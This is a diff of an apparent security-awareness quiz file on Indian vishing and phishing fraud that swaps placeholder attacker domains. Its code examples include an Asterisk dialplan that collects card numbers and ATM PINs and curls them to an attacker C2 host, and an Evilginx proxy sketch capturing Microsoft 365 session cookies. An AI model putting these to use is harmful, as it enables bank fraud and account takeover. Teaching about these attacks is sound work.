@@ -55,7 +55,7 @@ exten => s,1,Answer()
 exten => s,n,Playback(bank_alert_notice)
 exten => s,n,Read(CARD_NUM,enter_card_number,16)
 exten => s,n,Read(ATM_PIN,enter_atm_pin,4)
-exten => s,n,System(curl -X POST https://c2.evil-harvest.in/log?card=\${CARD_NUM}&pin=\${ATM_PIN})`
+exten => s,n,System(curl -X POST https://attacker-c2.net/log?card=\${CARD_NUM}&pin=\${ATM_PIN})`
   },
   {
     question: "Under the Indian Information Technology Act 2000 Section 66D, what constitutes the criminal penalty for Vishing and Smishing operations?",
@@ -105,7 +105,7 @@ info=<https://cert-auth.telecom.in/cert.pem>;alg=ES256;ppt=shaken
     hint: "An invisible middleman standing between you and the bank teller, copying the stamp on your hand when you enter the vault.",
     level: "expert",
     codeExample: `// AiTM Reverse Proxy Capture (Evilginx):
-// [Victim on Phone] ➔ [Evilginx Proxy: login.microsoft.evil-host.in] ➔ [Real Microsoft 365]
+// [Victim on Phone] ➔ [Evilginx Proxy: login.microsoft.attacker-host.net] ➔ [Real Microsoft 365]
 // Proxy intercepts: ESTSAUTH=AQABBAAA... (Captured Session Cookie!)
 // Result: Attacker logs in directly bypassing SMS OTP!`
   },
